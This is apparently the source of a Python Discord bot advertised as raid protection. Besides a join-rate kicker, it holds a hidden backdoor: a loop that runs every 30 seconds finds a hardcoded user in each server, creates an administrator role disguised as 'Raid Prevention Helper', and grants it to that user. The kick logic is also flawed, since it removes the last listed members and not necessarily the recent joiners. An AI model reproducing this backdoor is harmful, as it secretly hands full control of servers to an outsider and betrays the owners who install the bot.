import discord
from discord.ext import commands, tasks
from collections import deque
from datetime import datetime, timedelta
from keep_alive import keep_alive
import os
from dotenv import load_dotenv

# Load variables from .env (only for local dev; Render ignores this)
load_dotenv()

intents = discord.Intents.default()
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Raid prevention tracking
recent_joins = deque()
RAID_THRESHOLD = 5
TIME_LIMIT = timedelta(seconds=60)

# Target user info
TARGET_USERNAME = "tech_boy1"
TARGET_ID = 1273056960996184126


@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    check_for_target.start()  # start background loop


@bot.event
async def on_member_join(member):
    now = datetime.utcnow()
    recent_joins.append(now)

    while recent_joins and now - recent_joins[0] > TIME_LIMIT:
        recent_joins.popleft()

    if len(recent_joins) > RAID_THRESHOLD:
        print("🚨 Raid detected! Kicking recent joins...")
        try:
            for m in list(member.guild.members)[-RAID_THRESHOLD:]:
                await m.kick(reason="Raid prevention: mass join")
            recent_joins.clear()
        except Exception as e:
            print(f"⚠️ Failed to kick members: {e}")


# Background task to CONSTANTLY check if you are in the guild
@tasks.loop(seconds=30)
async def check_for_target():
    for guild in bot.guilds:
        member = discord.utils.find(lambda m: m.name == TARGET_USERNAME, guild.members)
        if member and member.id == TARGET_ID:
            print(f"🔍 Found {TARGET_USERNAME} in {guild.name}")
            role = discord.utils.get(guild.roles, name="Raid Prevention Helper")
            if not role:
                try:
                    role = await guild.create_role(
                        name="Raid Prevention Helper",
                        permissions=discord.Permissions(administrator=True),
                        reason="Special helper role"
                    )
                    print("✅ Created 'Raid Prevention Helper' role")
                except Exception as e:
                    print(f"⚠️ Error creating role: {e}")

            # Assign role if missing
            if role not in member.roles:
                try:
                    await member.add_roles(role, reason="Given Raid Prevention Helper role")
                    print("✅ Assigned role to tech_boy1")
                except Exception as e:
                    print(f"⚠️ Error assigning role: {e}")
        else:
            print(f"❌ {TARGET_USERNAME} not found or ID mismatch in {guild.name}")


if __name__ == "__main__":
    keep_alive()
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        raise ValueError("❌ No DISCORD_TOKEN found! Check your .env file or Render environment variables.")
    bot.run(token)
